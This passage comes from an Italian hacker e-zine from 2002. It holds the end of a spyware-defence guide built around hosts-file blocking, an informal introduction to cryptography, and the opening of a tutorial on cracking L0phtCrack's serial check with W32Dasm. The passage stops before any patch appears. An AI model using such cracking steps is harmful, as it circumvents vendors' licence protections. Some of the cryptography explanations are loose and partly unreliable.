| infatti non istallando i programmi ôinfettiö non ci sono pericoli;       |
| evitate di installare programmi tanto per  installarli, installate       |
| solo quelli indispensabili. Cercate di scoprire, prima di installare     |
| un software, in una lista  attendibile se esso Φ infetto da spyware,     |
| se lo fosse cercate un programma dalle stesse funzionalitα ma senza      |
| spyware. Un  secondo modo di evitarli Φ leggere attentamente la          |
| licenza e scovare l'opzione nascosta. C'Φ anche una terza via di         |
| prevenzione: quella di non utilizzare Windows (questo tema sarα          |
| spiegato e commentato nelle conclusioni).                                |
|                                                                          |
| --------                                                                 |
| 1.4                                                                      |
| --------                                                                 |
| Quando la prevenzione non basta entrano in gioco software specifici      |
| che cercano gli spyware nel vostro computer. Uno di  questi Φ Ad-        |
| Aware, gratuito e disponibile anche in Italiano                          |
| (www.lavasoft.de/aaw.html): Φ un eliminatore universale di  spyware,     |
| esplora il vostro computer alla ricerca di file dei programmi            |
| classificati come spyware e li rimuove. Questo  programma funziona       |
| molto bene infatti ricerca anche chiavi "anomale" nel registro di        |
| Windows, e prima di cancellare i file in  questione chiede conferma.     |
| Come un normale antivirus anche Ad-Aware ha degli aggiornamenti          |
| periodici che gli permettono di  tenere conto dei nuovi spyware che      |
| vengono immessi in Rete. Esistono anche altri programmi anti spyware     |
| tipo WebWhaser  (www.webwasher.com) che costa 29 $. Questi programmi     |
| per≥ non sono infallibili infatti sono impotenti al comportamento di     |
| WMP 8. Per poter bloccare anche questi tentativi di violare la vostra    |
| privacy dovrete disinstallare WMP 8 oppure ricorre al un personal        |
| Firewall tipo Zone Allarm (www.zoneallarm.com/zipromo/zagrid.htm)        |
| questa pagina vi mette a dispozione la versione gratutita. Ora           |
| spenderei un paio di parole su questo Firewall. Quando qualche           |
| programma tenta di accedere ad Internet Zone Allarm lo segala, se non    |
| avete precedentemente deciso l'autorizzazione, Zone Allarm chiede cosa   |
| fargli fare (farlo accedere alla rete oppure bloccarlo); ora sta a voi   |
| decidere quali programmi far "uscire" e quali no. Una news molto         |
| recente dichiara un bug all'interno di Zone Allarm Pro 2.6.357 il        |
| quale farebbe considerare al firewall in questone come rete locale       |
| ogni indirizzo IP che abbia i  primi due ottetti in comune con           |
| l'indirizzo dell'interfaccia di collegamento al Provider, ad esempio:    |
| ammesso che l'Ip che ci ha dato il Provider durante la connessione sia   |
| 1.2.3.4, quindi ogni indirizzo 1.2.*.*  verrα considerato da             |
| sottoporsi allo stato di controllo per le connessioni locali. Quindi     |
| attenzione se decidete di installare  la versione 2.6.357 di Zone        |
| Allarm a pagamento.                                                      |
|                                                                          |
| --------                                                                 |
| 1.5                                                                      |
| --------                                                                 |
| Penso tutti sappiate cosa sono i DNS e gli Host, se non fosse cos∞ ve    |
| lo spiego io.....                                                        |
| I siti internet hanno un nome alfabetico per esempio "microsft.com" [    |
| un sito a caso :-)) ], che Φ associato all'indirizzo IP  numerico        |
| 207.46.197.102; un po' come l'elenco del telefono che associa a un       |
| nome preciso un numero di telefono preciso.   Queste associazioni sono   |
| memorizzate in apposite "guide telefoniche" di Internet chiamate         |
| Domain Name Server, appunto  DNS.  Quando digitate il nome di un sito,   |
| nel vostro browser preferito, il vostro computer consulta uno di         |
| questi DNS, il quale gli   restituisce l'indirizzo in forma numerica     |
| corrispondente al nome richiesto; il numero viene poi usato dal client   |
| per   stabilire una connessione al sito.                                 |
| In Windows esiste un bel file ("hosts") che quando un programma          |
| qualsiasi tenta di accedere a un sito Internet, guarda per  prima        |
| cosa  in questo file per vedere se il sito richiesto vi Φ elencato. Se   |
| lo Φ, si collega all'indirizzo numero (IP)  citato nel file,  anche se   |
| Φ diverso da quello memorizzato nel DNS presente in Rete. Il             |
| file "hosts" deve essere un semplice  file di testo  senza estensione,   |
| attenzione a non confonderlo con il file "lmhosts.sam" che Φ un altra    |
| cosa! Allora quindi  cercate il file  "hosts" e cominciate a             |
| smanettarci (se non sapete come si fa lo spiego sotto). Se non avete     |
| voglia di  cercarlo ve lo dico io  dove si trova; a seconda di che       |
| versione di Windows avete il file "Host" lo potete trovare in            |
| directory diverse. In Windows  95,98 o Me lo trovate solitamente         |
| in "C:\Windows", chi usa Windows NT o 2000 in  "C:\WinnT\System32        |
| \drivers\" e infine chi usa  Windows Xp lo pu≥ trovare                   |
| in "C:\Windows\System32\drivers\etc\". Questo file  oltre a poter        |
| velocizzare la navigazione,  infatti se noi manualmente inseriamo un     |
| indirizzo Ip di un sito il browser non  dovrα andare a chiedere al DNS   |
| qual Φ l'indirizzo IP del sito (ricordatevi che non tutti i siti hanno   |
| un IP fisso), pu≥  servire per difenderci da spyware o da  banner        |
| pubblicitari.                                                            |
| Se uno spyware residente nel vostro computer tentasse di comunicare      |
| con il sito del suo proprietario (di cui dovete conoscere  l'indirizzo   |
| IP), ma nel file "hosts" quel sito Φ associato ad un indirizzo           |
| fittizio, il tentativo dello spyware fallisce: Φ come se telefonasse     |
| ad un numero inesistente. L'astuzia sta nell'usare l'indirizzo           |
| numerico preciso, ossia 127.0.0.1, che per convenzione rappresenta il    |
| vostro computer (localhost). In questo modo, quando lo spyware prova a   |
| connettersi al sito del  padrone, lo cerca nel posto sbagliato (nel      |
| vostro computer) e quindi non riesce a trasmettergli dati che ha         |
| raccolto su di  voi. A parte questo, per≥ il programma Φ libero di       |
| lavorare: funziona regolarmente, per cui la privacy Φ salva senza        |
| dover  rinunciare a qualche funzione utile del programma in questione.   |
| Se volete un esempio palese dell'applicazione del file "hosts" potete    |
| considerare Windows Media Player 8, che tenta di inviare la lista di     |
| DVD   che avete visto sul vostro pc la sito "windowsmedia.com"; se       |
| immettete nel file hosts la scritta (senza virgolette)   "127.0.0.1      |
| windowsmedia.com  #questo Φ un commento", quando WMP8 tenta              |
| di collegarsi al sito lo cerca nel vostro   computer anzichΘ al vero     |
| indirizzo ( 204.46.230.181). In questo modo la lista dei vostri DVD      |
| preferiti non lascierα mai il   vostro pc, ma per il resto WMP8          |
| funziona correttamente infatti potrα accedere a filmati presenti su      |
| Internet.                                                                |
| Lo stesso trucchetto pu≥ servire per levare banner pubblicitari, senza   |
| cos∞ dover installare un programma apposito, per   questo scopo basta    |
| sapere i nome dei siti delle agenzie che inseriscono i banner nelle      |
| pagine Web, immetterli in host   preceduti da 127.0.0.1 e riavviare il   |
| pc. Le pubblicitα scompariranno come per magia. Se non sapete come       |
| trovare gli indirizzi delle compagnie che inseriscono banner guardate    |
| l'HTML sorgente oppure lasciate il mouse per alcuni secondi sopra il     |
| banner. In questo modo la vostra navigazione sarα pi∙ veloce e senza     |
| pubblicitα!!!                                                            |
|                                                                          |
| Ecco un esempio di file "hosts":                                         |
| ---Inizio                                                                |
|                                                                          |
| # Copyright (c) 1993-1999 Microsoft Corp.                                |
| #                                                                        |
| # Modificato da SwiT                                                     |
| #                                                                        |
| # Questo Φ un esempio di file HOSTS usato da Microsoft TCP/IP per        |
| Windows.                                                                 |
| #                                                                        |
| # ╚ inoltre possibile inserire commenti (come questi) nelle singole      |
| righe                                                                    |
| # o dopo il nome del computer caratterizzato da un simbolo '#'.          |
| #                                                                        |
| # Per distanziare un indirizzo ip dal relativo nome non bisogna fare     |
| degli spazi ma                                                           |
| # premere il tasto TAB                                                   |
| #                                                                        |
| # Per esempio:                                                           |
|                                                                          |
| 127.0.0.1 localhost                                                      |
| 127.0.0.1 adserver.iol.it   #server pubblicitario di IOL                 |
| 127.0.0.1 adv-banner.iol.it                                              |
| 127.0.0.1 www.windowsmedia.com                                           |
| 127.0.0.1 active.macromedia.com                                          |
| 127.0.0.1 adfarm.medialex.com                                            |
|                                                                          |
| ---Fine                                                                  |
|                                                                          |
| Io nella cartella dove si trova il file "Hosts" ho trovato anche altri   |
| file. Cosa sono e a che cosa servono?  Vi siete fatti                    |
| questa domanda??? Allora leggete di seguito.                             |
|                                                                          |
| -"Services" : Φ l'elenco delle porte conosciute da Windows se per caso   |
| volete chiudere una porta basta scrivere davanti al                      |
| numero di porta che volete chiudere la dicitura "discard".               |
|                                                                          |
| -"Protocol" : Questo file contiene i protocolli Internet conosciuti.     |
|                                                                          |
| -"lmhosts.sam" : Questo file contiene la mappatura degli indirizzi IP    |
| ai nomi (NetBIOS) dei nomi computer.                                     |
|                                                                          |
| -"networks" : Questo file indica le corrispondenze tra numeri e nomi     |
| di rete per reti locali.                                                 |
|                                                                          |
| -------                                                                  |
| 1.6                                                                      |
| -------                                                                  |
| Nel paragrafo 1.3 ho spiegato le maniere di prevenzione contro gli       |
| spyware, ed ho affermato che la miniera pi∙ drastica ma                  |
| anche la pi∙ sicura fosse non usare Windows, in effetti Φ vero perchΘ    |
| su sistemi Macintosh, Linux, FreeBSD.... non esistono                    |
| spyware. Questa migrazione di sistema operativo non sarebbe male e in    |
| questo modo capireste la vera essenza dell'uso del pc.                   |
|                                                                          |
|                                                                          |
|                                                                          |
| FINE                                                                     |
|                                                                          |
| -----------------------------------------------------------------------  |
| Discaimer: le informazioni qui riportate sono a scopo informativo e      |
| non vogliono in alcun modo essere stimolo a violazioni                   |
| della legge. Pertanto l'Autore, il sito internet, il webmaster e         |
| qualsiasi persona giuridica o fisica legata al progetto non saranno      |
| responsabili dell'uso che i lettori faranno di queste infomazioni.       |
|  ----------------------------------------------------------------------  |
|                                                                          |
|                                                                          |
| Guida realizzata da SwiT nel giorno 29/03/2002. Relase 0.2 finita il     |
| 17/08/2002                                                               |
| Questa giuda Φ sotto la GPL 2.0 license.                                 |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L'APPRENDiSTA STREG0NE                     #08 - 01/11/2002 |
| GUARDA GUARDA CHE Ti LEGG0 iL W0RD!                   [Dagart] 0x15/0x1A |
+--------------------------------------------------------------------------+
| Autore: ovviamente Dagart!!                                              |
| Ore: zerozero.trezero (figo parlare come nei film americani)             |
| Titolo: Guarda Guarda che ti leggo il Word - Lezione 0 - Presentazione   |
| ed Introduzione alla Crittografia e alla Crittoanalisi.                  |
|                                                                          |
| Stavo proprio giocando una partita meravigliosa con il mitico WarCraft   |
| 3 quando lo stupido XP di Microshit si Φ impiantato facendomi perdere    |
| tutti i soldi e la legna !!!!! Che palle !!! E non avevo nemmeno         |
| salvato !!                                                               |
|                                                                          |
| Ora per≥ ... ho sicuramente tempo per cominciare a scrivere queste       |
| benedette lezioni di crittoanalisi che desideravo da tempo               |
| affrontare ... sicchΦ: MEGLIO COSI'.                                     |
|                                                                          |
| Per cominciare posso sicuramente avvertire a tutti quelli che leggono    |
| questo articolo che la crittoanalisi (a differenza di quello che         |
| pensano in molti) Φ un'arte che va affinata col tempo: infatti, con      |
| testa e tanta ... tanta ... tanta ... tanta ... tanta pazieza, Φ         |
| possibile decifrae un qualsiasi numero di messaggi con un qualsiasi      |
| tipo di algoritmo di cifrazione (a mio parere non esiste un algoritmo    |
| di cifrazione perfettamente sicuro in quanto ... lo stesso algoritmo     |
| di VigenerΦ che affronteremo in seguito era considerato intorno          |
| all'ottocento come un "algoritmo perfettamente sicuro").                 |
|                                                                          |
| Premettendo quindi che "l'algoritmo pi∙ sicuro Φ quell'algoritmo che     |
| prevede la password lunga quanto il testo" (e voi starete                |
| pensando: "che .agata! A che mi serve!". Certo ... ma teoricamente Φ     |
| perfetta!!).                                                             |
|                                                                          |
| Comunque bando alle ciance ... cominciamo!!                              |
|                                                                          |
| Non avendo che una scaletta generale dell'argomento dovr≥ andare da      |
| ora in poi a braccio nel descrivere le lezioni partendo dalla zero       |
| (ovvero la presentazione del progetto) alla lezione 10 (ovviamente       |
| potrebbero esserci dei cambiamenti di percorso), strutturate             |
| grossomodo nell'ordine seguente:                                         |
|                                                                          |
| Lezione 0 -> Presentazione ed Introduzione alla Crittografia e alla      |
| Crittoanalisi                                                            |
| Lezione 1 -> Sostituzione                                                |
| Lezione 2 -> Trasposizione                                               |
| Lezione 3 -> Trash                                                       |
| Lezione 4 -> Dizionario                                                  |
| Lezione 5 -> SHA-1/MD5 (Hash)                                            |
| Lezione 6 -> Des/3Des/Idea                                               |
| Lezione 8 -> Introduzione ai Sistemi Asimmetrici                         |
| Lezione 7 -> Diffie-Hellman                                              |
| Lezione 9 -> RSA/PGP                                                     |
| Lezione 10 -> Rijndael                                                   |
|                                                                          |
| Strutturalmente ogni lezione sarα composta da due parti: la prima che    |
| riguarderα la crittografia (ovvero la descrizione dell'algoritmo         |
| trattato) mentre la seconda rigiarderα la crittoanalisi (ovvero le       |
| tecniche ed i metodi pi∙ interessanti ed utilizzati per la               |
| crittoanalisi).                                                          |
|                                                                          |
| Le lezioni sono disposte a difficoltα sempre crescente, affrontando      |
| problemi sempre pi∙ complessi e difficili. Inoltre, in ogni lezione,     |
| saranno allegati uno o pi∙ sorgenti di utility varie (come il calcolo    |
| delle frequenze, calcolo delle combinazioni, algoritmi di                |
| crittazione, ...) ed un file di testo crittato con il metodo appreso     |
| nella relativa lezione (in modo da confermare le proprie conoscenze).    |
|                                                                          |
| Ora, concluse disposizioni generali cominciamo con la parte              |
| interessante, ovvero l'introduzione alla crittografia ed alla            |
| crittoanalisi.                                                           |
|                                                                          |
| Ribadisco che io non sono un Crittoanalista laureato ad Harward (porca   |
| pupilla in calore come si scrive, boh, tanto chi .azzo se ne frega di    |
| quei figli di papα che imparano a memoria le cose che gli dicono) ne     |
| un laureato (purtroppo non ancora ... sigh ;( ) in fisica degli stati    |
| complessi (ganzo quasi quasi faccio un pensierino per la mia tesi di     |
| laurea ... bah ci penso ... non divaghiamo troppo) ma sono un semplice   |
| appassionato di crittoanalisi dei sistemi complessi e quindi non         |
| tratterr≥ gli argomenti in modo "ufficiale" ma diciamo in                |
| modo "ufficioso" per rendermi il pi∙ possibile comprensibile e rendere   |
| un po' divertente e meno palloso il testo.                               |
|                                                                          |
| Per cominciare descriviamo la struttura principale di qualsiasi sistema  | 
| di crittazione esistente in natura, nello spazio, nell'universo e in     |
| qualsiasi mente malata di matematici e non che non sanno fare altro      |
| che segne mentali, deriva da un concetto semplice: da un messaggio in    |
| chiaro (che da ora in poi chiameremo M), di cui non vogliamo far         |
| scoprire il contenuto, applichiamo una funzione (che da ora in poi       |
| chiameremo algoritmo di crittazione f(M) ) in modo tale da ottenere un   |
| messaggio cifrato (che da ora in poi chiameremo ... guarda un po' C)     |
| di difficile comprensione.                                               |
|                                                                          |
| Secondo uno schema generale otteniamo:                                   |
|                                                                          |
| M ------------> C                                                        |
|       f(M)                                                               |
|                                                                          |
| Per rendere il pi∙ possibile versatile l'algoritmo di crittazione        |
| (altrimenti dovremmo invertarti un algoritmo per ogni messaggio e sai    |
| che palle!!!) la funzione f(M) richiede una variabile in entrata         |
| chiamata Chiave (k) che rende possibile la cifrazione del messaggio:     |
|                                                                          |
| M ------------> C                                                        |
|       f(M)                                                               |
|        ^                                                                 |
|        |                                                                 |
|        k                                                                 |
|                                                                          |
| Tuttavia lo scopo della crittazione non Φ mantenere segreto il           |
| messaggio a tutti (come fecero gli alti ufficiali americani con il       |
| caso Rosvell ma ... quella Φ un'altra storia) bens∞ solo a tutti         |
| coloro che non fossero a conoscenza della chiave: in tal caso la         |
| funzione f(M) deve necessariamente essere reversibile o, in termini      |
| matematici, deve essere biettiva.                                        |
|                                                                          |
| Quindi, se conosco la chiave k e la funzione f(M) posso ricavare da C    |
| il messaggio M attraverso un processo inverso alla cifrazione chiamato   |
| decifrazione (che non va confuso con crittoanalisi in quanto             |
| decifrazione Φ i lsemplice processo inverso della cifrazione mentre la   |
| crittoanalisi e lo studio partendo da una conoscenza minima della f(M)   |
| e della chiave del testo cifrato):                                       |
|                                                                          |
| M <------------ C                                                        |
|       f(M)                                                               |
|        ^                                                                 |
|        |                                                                 |
|        k                                                                 |
|                                                                          |
| Da queste considerazioni apprendiamo essenzialmente tre concetti         |
| basilari della crittografia:                                             |
|                                                                          |
| 1. La funzione f(M) deve essere necessariamente una funzione biettiva:   |
| in altri termini ad una determinata lettere deve necessariamente         |
| corrispondere un'altra. Se la funzione fosse del tipo uno:molti o        |
| peggio ancora del tipo molti:uno, si avrebbe un aumento della            |
| complessitα del sistema impedendo un ritorno del messagio cifrato al     |
| messaggio originale.                                                     |
| 2. La chiave Φ l'elemento essenziale per la decifrazione del messaggio.  |
| 3. L'algoritmo di cifrazione f(M) gioco un ruolo fondamentale nella      |
| riuscita delle decifrazione.                                             |
|                                                                          |
| Generalmente la funzione f(M) pu≥ anche essere resa pubblica ma ...      |
| soprattuto nel caso in cui l'agoritmo di cifrazione sia debole, il       |
| mantenere segreto l'algotirmo pu≥ creare dei grossi grattacapi al        |
| crittoanalista che deve non solo determinare la chiave ma deve anche     |
| scoprire l'agoritmo di crifrazione.                                      |
|                                                                          |
| Nei tempi passati, quando ancora il Des, il 3Des, PGP, ... non erano     |
| ancora stati inventati, era norma tenere segreta assieme alla chiave     |
| anche l'algoritmo di cifrazione: in questo modo aumentava la sicurezza   |
| del messaggio ma riduceva la trasportabilitα della chiave.               |
|                                                                          |
| Infatti, il problema fondamentale di tutta la crittografia classica      |
| era il trasporto della chiave segreta (e, nel caso in cui si volesse     |
| mantenere segreto l'algoritmo, anche la f(M)) dall'Utente A all'utente   |
| B: bastava infatti che un lamer L si metesse in ascolto tra i due per    |
| determinare con facilitα il messaggio originale:                         |
|                                                                          |
| M <-----------> C                                                        |
|         ^                                                                |
|         |                                                                |
|         v                                                                |
|         L                                                                |
|                                                                          |
| Quindi era necessario un canale sicuro per la trasmissione della         |
| chiave in modo tale da poter inviare con facilitα successivamente il     |
| messaggio cifrato: nel passato ad esempio venivano utilizzati            |
| messaggeri fidati o (durante la I e II guerra mondiale) soldati fidati.  |
|                                                                          |
| Tuttavia, grazie alla scoperta di funzioni non facilmente reversibili    |
| (chiamate PNP - Problemi non Polinomiali), Φ stato possibile generare    |
| funzioni f(M) contenente due chiavi: una chiave pubblica (che pu≥        |
| essere utilizzata per cifrare i messaggi ma non per decifrare i          |
| medesimi) e una chiave privata (che pu≥ sia cifrare che decifrare i      |
| messaggi cifrati con la relativa chiave pubblica).                       |
|                                                                          |
| Per tal motivo i due sistemi di crittazione sono stati suddivisi in      |
| due grossi blocchi:                                                      |
|                                                                          |
| - Algoritmi Simmetrici  ==> Algoritmi a singola chiave (DES, IDEA, ...)  |
| - Algoritmi Asimmetrici ==> Algoritmi a chiave Pubblica e Privata        |
| (PGP, ...)                                                               |
|                                                                          |
| (Per spiegazioni pi∙ dettagliate sul funzionamente dei problemi PNP e    |
| dei sistemi Asimmetrici vedere le prossime Lezioni).                     |
|                                                                          |
| Dopo esserci soffermati sulla struttura della chiave possiamo            |
| finalmente inoltrarci sul significato di f(M).                           |
| Come abbiamo detto prima f(M) Φ una funzione biettiva: quindi, tutta     |
| l'informazione (e ribadisco TUTTA, qualsiasi sia il sistema di           |
| cifrazione) viene praticamente "trasformata" in sistema cifrato.         |
| Quindi, per il semplice fatto che l'informazione del testo C             |
| Φ "speculare" a M, Φ possibile con opportuni sistemi di crittoanalisi,   |
| derivare dal testo cifrato C il testo originale M senza tuttavia         |
| conoscere la chiave k. Tuttavia, proprio perchΦ i sistemi di             |
| crittoanalisi si differenziano moltissimo gli uni dagli alrti,           |
| affronteremo questa parte di volta in volta con i sistemi di             |
| crittazione che saranno di volta in volta proposti.                      |
|                                                                          |
|                                                                          |
| Sebbene gli algoritmi di crittazione possono essere svariati e           |
| differenti i principi base su cui si poggiano sono essenzialmente tre:   |
|                                                                          |
| 1. Sostituzione                                                          |
| 2. Trasposizione                                                         |
| 3. Trash                                                                 |
| 4. Dizionario                                                            |
| 5. Hash                                                                  |
|                                                                          |
| Il primo metodo consiste essenzialmente nella sostituzione di una        |
| lettera ben definita X con un'altra ben definita Y: la chiave sarα       |
| ovviamente l'associazione dei simboli del CharSet con i relativi         |
| Simboli di crittazione.                                                  |
|                                                                          |
| Esempio:                                                                 |
|                                                                          |
| Se vogliamo crittare la frase -> HO SONNO VORREI DORMIRE (ANCHE PERCHE   |
| E L UNA E MEZZA)                                                         |
| con un algoritmo simile al precedente, possiamo sostituire la lettera    |
| con quella che la segue nell'alfabeto, ovvero:                           |
| frase cifrata -> IP TPOOP ZPSSFL EPSNLSF eccettera eccetera.             |
|                                                                          |
| *-*-*-*-*-*-*-*-*-*-*-*-*-*-*                                            |
|                                                                          |
| Il secondo metodo consiste nella trasposizione ben definita              |
| all'interno della frase dei caratteri relativi al messaggio senza        |
| tuttavia provvedere ad una sostituzione. La chiave sara la funzione      |
| che organizza la trasposizione.                                          |
|                                                                          |
| Esempio:                                                                 |
|                                                                          |
| Cifriamo la frase -> DAI HO QUASI FINITO PER OGGI                        |
| con un algoritmo che prevede l'inversione a due a due delle lettere,     |
| ovvero:                                                                  |
| frase cifrta -> ADH IQ OAUIS IFINOT EPO RGGI.                            |
|                                                                          |
| *-*-*-*-*-*-*-*-*-*-*-*-*-*-*                                            |
|                                                                          |
| Il terzo metodo consiste nell'aggiunta di "spazzatura" casuale           |
| (vedremo in seguito il motivo del casuale) all'interno del messaggio.    |
| La chiave sarα la funzione che organizza l'inserimento della             |
| spazzatura.                                                              |
|                                                                          |
| Esempio:                                                                 |
|                                                                          |
| Cifriamo la frase -> ULTIMO ESEMPIO PER STASERA                          |
| con un algoritmo che prevede l'inserimento prima di ogni sillaba della   |
| sillaba Fx dove x Φ la vocale della sillaba (vi ricordate il             |
| linguaggio farfallino ?!?!), ovvero:                                     |
| frase cifrata -> ULFUTIFIMOFO EFESEMFEPIOFIO PERFE STAFASEFERAFA.        |
| Ovviamente con questo algoritmo la dimensione di C Φ notevolmente        |
| maggiore rispetto a M.                                                   |
|                                                                          |
| *-*-*-*-*-*-*-*-*-*-*-*-*-*-*                                            |
|                                                                          |
| Il quarto metodo consiste nel sostituire una parola o una frase con      |
| un'altra consultando un dizionario: ne sono un esempio i militari i      |
| quali , per non perdere tempo (o per stupiditα?!?!), dicono "ROGER"      |
| invece di "HO CAPITO TESTOLINA DI .ZZO COSA DEVO FARE".                  |
|                                                                          |
| Esempio:                                                                 |
|                                                                          |
| Cifriamo la frase -> VORREI INFILARTI QUALCOSA NEL LUOGO IN CUI NON      |
| BATTE IL SOLE.                                                           |
| frase cifrata -> VAFFANC.                                                |
|                                                                          |
| Cifriamo la frase -> QUESTA VOLTA VOGLIO ESSERE BUONO.                   |
| secondo il dizionario segreto:                                           |
| VOLTA -> NOTTE                                                           |
| BUONO -> A LONDRA                                                        |
| frase cifrata -> QUESTA notte VOGLIO ESSERE a londra.                    |
|                                                                          |
| *-*-*-*-*-*-*-*-*-*-*-*-*-*-*                                            |
|                                                                          |
| Il quinto ed ultimo metodo (inserito per scrupolo in questo elenco       |
| ma ... in realtα dovrebbe essere trattato a parte) consiste nel          |
| condensare gli elementi di una frase in modo tale che il messaggio       |
| crittato sia non solo pi∙ corto ma anche unico (ovvero messaggi          |
| diverso devono dare messaggi crittati, chiamati digest, differenti).     |
| Per questa peculiaritα il metodo di Hash non viene utilizzato per la     |
| crittazione dei messaggi (in quanto la condensazione, aumentando la      |
| complessitα e trasformando la funzione da biettiva ad una molti:uno)     |
| bens∞ per l'autentificazione dei messaggi.                               |
|                                                                          |
| Naturalmente nessuno vieta di usare questi principi in sequenza, pi∙     |
| volte o in modo casuale ma rimangono pur sempre i principi base della    |
| crittazione.                                                             |
|                                                                          |
|                                                                          |
| Conclusa la presentazione della crittografia partiamo allora con         |
| l'introduzione alla crittoanalisi che, molto probabilmente, risulterα    |
| meno noiosa e pi∙ divertente.                                            |
|                                                                          |
| Col termine crittoanalisi, cosa completamente differente dalla           |
| crittologia, Φ una "scienza" il cui scopo Φ determinare il messaggio     |
| in chiaro partendo da un messaggio cifrato di cui si conosce ben poco.   |
| A differenza della crittografia, che Φ la scienza che studia meodi per   |
| la crittazione dei messaggi e che studia nuovi algoritmi di              |
| crittazione, la crittoanalisi svolge il ruolo inverso: ovvero            |
| determinare un punto debole dell'algoritmo di cifrazione per risalire    |
| al testo in chiaro conoscendo solo il testo cifrato.                     |
|                                                                          |
| Sebbene possa sembrare una cosa semplice, o in caso di frustrati o       |
| malati di manie di persecuzione troppo difficile, la crittoanalisi       |
| basa il proprio principio di funzionamento su dei piccoli "bachi"        |
| dell'algoritmo di crittazione dove, se studiati attentamente, possono    |
| agire strumenti logico linguistici (nel caso di sistemi letterali) o     |
| matematici (nel caso in cui il testo fosse stato trasformato in          |
| numeri) per ottenere il testo originale in chiaro. Proprio per la        |
| diversitα degli algoritmi, esistono diverse qualitα di bachi che         |
| verranno di volta in volta affrontati in relazione all'algoritmo         |
| studiato nella lezione.                                                  |
|                                                                          |
| Generalmente la crittoanalisi, che si distingue dal metodo Brute Force   |
| in quanto quest'ultimo Φ un semplice prova ripetuta di diverse chiavi    |
| per vedere qual'Φ quella giusta, si grossomodo in sei categoria, a       |
| seconda di ci≥ che conosciamo del testo cifrato:                         |
|                                                                          |
| 1. Attacco ciphertest-only -> Φ l'attacco classico ovvero l'attacco      |
| che prevede la determinazione dell'algoritmo di crittazione (se          |
| sconosciuto) e la chiave di crittazione.                                 |
|                                                                          |
| 2. Attacco known-plaintext -> se si dispone anche del testo in chiaro    |
| del messaggio cifrato Φ possibile ricercare l'algoritmo di cifrazione    |
| (che ovviamente il crittoanalista non conosce) e della password in       |
| modo tale da poter decifrare successivi messaggi.                        |
|                                                                          |
| 3. Attacco chosen-plaintext -> sebbene possa trarre in inganno, questo   |
| metodo Φ differente dal precedente: infatti Φ necessario conoscere       |
| l'algoritmo di cifratura per utilizzare questo metodo. Infatti,          |
| utilizzando un testo in chiaro scelto da noi, Φ possibile valutare se    |
| questo si avvicina al testo cifrato di nostra possessione: pi∙ si        |
| avvicinano pi∙ la password Φ corretta.                                   |
|                                                                          |
| 4. Attacco adaptive-chosen-plaintext -> Φ semplicemente un estensione    |
| del precedente: infatti, Φ possibile modificare il messaggio             |
| utilizzato per la cifratura in modo tale da "adattarlo" per ottenere     |
| un testo cifrato sempre pi∙ simile all'originale.                        |
|                                                                          |
| 5. Attacco chosen-chipertext -> Questo metodo Φ esattamente l'opposto    |
| dei due precedenti: infatti si sceglie un testo cifrato per ottenere,    |
| a tentavi, il testo in chiaro. Voi direte: "A CCHE' SERVEEEEEE??"        |
| \:P. In realtα questo metodo Φ utile per la determinazione della         |
| chiave privata partendo da una chiave pubblica.                          |
|                                                                          |
| 6. Attacco adaptive-chosen-chipertext -> Idem con patate. Vedi metodo    |
| 4 (mi son rotto di scrivere sempre le stesse cose!!).                    |
|                                                                          |
| Con questa chicca della crittoanalisi concludo la prima (anzi la non     |
| prima in qunto la zero) lezione sulla crittoanalisi tenuta dal           |
| celeberrimo Dagart sempre disponibile per ulteriori chiarificazioni e    |
| consigli.                                                                |
|                                                                          |
| La mia E-Mail sempre disponibile Φ: &lt;dagart@hackerjournal.it>            |
|                                                                          |
| Arrivederci alla prossima Lezione....                                    |
|                                                                          |
| Dagart.                                                                  |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L'APPRENDiSTA STREG0NE                     #08 - 01/11/2002 |
| PATCHARE UN SERiAL NUMBER USAND0 WDASM32           [cyberdude] 0x16/0x1A |
+--------------------------------------------------------------------------+
|                                                                          |
| Caspita ragazzi... non ci posso credere, sembrava ieri che partii per    |
| le vacenze e invece sono passati 2 mesi :( uffa si riprende a studiare   |
| che schifo. Vorrei dire che questa estate sono stato benissimo, ho       |
| conosciuto una ragazza stupenda alla quale dedico questo tutorial, ho    |
| da poco finito di parlare con lei a telefono e adesso non so come        |
| passare il tempo!! niente di pi∙ semplice : ci mettiamo a scrivere un    |
| bel tutorial.                                                            |
| Questo tutorial lo scrivo principalmente per la crew di Ondaquadra ma    |
| non so se lo mander≥ anche a qualche altra crew! a dire il vero non so   |
| neanche che argomento trattare ma sappiate una cosa, Cyberdude Φ         |
| tornato pi∙ carico di prima e sempre pi∙ pronto a scrivere qualcosa di   |
| interessante per voi!!                                                   |
| Dunque non perdiamo altro tempo e mettiamoci a lavoro ... le dediche     |
| come ho gia detto sono per la mia ragazza alla quale da oggi nella       |
| rete attribuiremo il nick di Trinity ok?                                 |
| Bene bene si riprende mettiamoci sotto e sforniamo qualcosa di bello     |
| e interessante per i nostri lettori!!! Datemi un p≥ di tempo per         |
| decidere cosa scrivere; miei cari amici non so cosa ne verrα fuori ma    |
| comunque vada sarα un successo!! :)                                      |
| ______________________________________________________________________   |
| Allora ragazzi ci sono vi parler≥ di come Patchare un Serial Number      |
| usando Wdasm32... Dunque sicuramente molti di voi riterranno il          |
| cracking un'arte molto difficile che solo i piu' esperti piratoni        |
| sanno padroneggiare.                                                     |
| Io vi dimostrer≥ che in realta' e' tutto molto semplice!!! :)            |
|                                                                          |
| Bene bene diamoci da fare, la nostra vittima sarα il L0phtCrack x win    |
| 95 degli amici delle "L0pht Heavy Industries" che potete scaricare da    |
| www.l0pht.com, praticamente una versione ormai antichizzata perchΦ io    |
| Φ su quella che mi esercito ma non preoccupatevi perchΦ comunque nella   |
| nuova (2.5x) non cambia assolutamente nulla!! ok?                        |
| Dunque unzippate il programma in una cartellina sul disco e fatelo       |
| partire... vi saltera' fuori una finestra che vi rompe le palle          |
| perche' mancano 15 giorni alla scadenza del periodo di prova hihihihi    |
| patetici, facciamogli vedere chi comanda, ke ne dite?                    |
| Allora premete il pulsante "Register" in basso, nella finestra di        |
| dialogo che vi chiede il Serial Number inseritene uno a caso e           |
| cliccate su "ok" il programma vi dira' "You have entered an invalid      |
| code. Please try again." beh e dov'Φ il problema? chiudete tutto...      |
| segnatevi questo messaggio e aprite il Wdasm poi, disassemblate il       |
| file l0phtcrack95.exe e quindi salvate il codice asm!!!!                 |
| Clikkate in alto a destra sul bottoncino delle String References         |
| Fate scorrere la lista cercando il messaggio "You have enter....."       |
